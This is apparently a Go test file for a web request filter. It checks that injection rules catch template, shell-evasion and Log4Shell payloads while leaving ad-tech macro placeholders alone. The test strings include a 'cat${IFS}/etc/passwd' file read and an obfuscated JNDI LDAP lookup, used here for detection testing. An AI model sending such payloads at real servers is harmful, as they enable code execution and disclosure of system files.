package engine

import "testing"

func rulePattern(t *testing.T, id string) func(string) bool {
	t.Helper()
	for _, cr := range blockRules {
		for _, r := range cr.Rules {
			if r.ID == id {
				return func(s string) bool { return r.Pattern.MatchString(NormalizeInput(s)) }
			}
		}
	}
	t.Fatalf("no rule %s", id)
	return nil
}

// Bare ${NAME} macros (unexpanded ad-tech placeholders) are not template or
// Log4Shell injection; expressions and shell evasion variables are. The
// positive cases are checked on the pattern itself: through
// MatchRulesScored a tier-1 rule on the same payload (/etc/passwd, jndi)
// blocks first and the tier-3 rules are never reached.
func TestMacrosAreNotInjection(t *testing.T) {
	xss009, l4s004 := rulePattern(t, "XSS-009"), rulePattern(t, "L4S-004")
	for _, s := range []string{"https://x.example/p?q=${7*7}", "https://x.example/p?q={{config.items()}}",
		"https://x.example/p?c=cat${IFS}/etc/passwd", "https://x.example/p?q=${user.name}", "https://x.example/p?a=${1}"} {
		if !xss009(s) {
			t.Errorf("XSS-009 missed %q", s)
		}
	}
	if !l4s004("https://x.example/?q=${${lower:j}${lower:n}${lower:d}i:ldap://x}") {
		t.Error("L4S-004 missed the nested ${lower:} obfuscation")
	}

	e := New(Config{BlockThreshold: 10})
	for _, s := range []string{
		"https://sync.example/x?redir=https://ad.example/u?xuid=${CRITEO_USER_ID}&g=${GDPR}",
		"https://sync.example/x?a=${A}&b=${B}&c=${C}&d=${pubmatic_uid}",
	} {
		ms, _ := e.MatchRulesScored(NormalizeInput(s))
		for _, m := range ms {
			if m.RuleID == "XSS-009" || m.RuleID == "L4S-004" {
				t.Errorf("%s fired on the bare macros of %q", m.RuleID, s)
			}
		}
	}
}

func TestNeutralizeBareMacros(t *testing.T) {
	for in, want := range map[string]string{
		"/x?xuid=${CRITEO_USER_ID}&g=${gdpr}":         "/x?xuid=CRITEO_USER_ID&g=gdpr",
		"/x?xuid=%24%7BCRITEO_USER_ID%7D":             "/x?xuid=CRITEO_USER_ID",
		"/x?c=cat${IFS}/etc/passwd":                   "/x?c=cat${IFS}/etc/passwd",
		"/x?a=${1}&b=${HOME}":                         "/x?a=${1}&b=${HOME}",
		"/x?q=${jndi:ldap://x/a}":                     "/x?q=${jndi:ldap://x/a}",
		"/x?q=${7*7}":                                 "/x?q=${7*7}",
		"/plain/path?no=macros":                       "/plain/path?no=macros",
		"/c?gdpr=${user.gdpr}&c=${user.gdpr_consent}": "/c?gdpr=user.gdpr&c=user.gdpr_consent",
		"/set_partner_userid_get/smart/[sas_uid]":     "/set_partner_userid_get/smart/sas_uid",
		"/x?items[0]=a&r=[a-z]":                       "/x?items[0]=a&r=[a-z]",
		"/x?u=%5Bsas_uid%5D":                          "/x?u=sas_uid",
	} {
		if got := NeutralizeBareMacros(in); got != want {
			t.Errorf("NeutralizeBareMacros(%q) = %q, want %q", in, got, want)
		}
	}
}
